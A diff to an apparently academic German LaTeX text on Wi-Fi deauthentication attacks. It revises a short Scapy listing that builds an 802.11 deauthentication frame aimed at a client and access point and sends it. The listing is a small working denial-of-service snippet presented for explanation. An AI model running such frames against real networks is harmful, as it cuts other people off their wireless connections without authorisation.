@@ -83,11 +83,11 @@ Ein Nachteil dieses Ansatzes ist, dass \texttt{aireplay-ng} mit dem Aussenden de
 Alternativ kann die Deauthentifikation mit wenigen Zeilen Python-Code unter Verwendung der Bibliothek \texttt{Scapy} durchgeführt erden.
 
 \begin{minted}[breakbytoken,breaklines]{python}
+	import scapy.all as scapy
 	# Construct a deauth packet, subtype 12 
 	# is the 802.11 code for a deauthentication-frame
 	# bssid is equivalent to the MAC of the AP
-	p = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=clientMac, addr2=bssid,
-	addr3=bssid) / scapy.Dot11Deauth(reason=1)
+	p = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=clientMac, addr2=bssid, addr3=bssid) / scapy.Dot11Deauth(reason=1)
 	scapy.send(p)
 \end{minted}
 
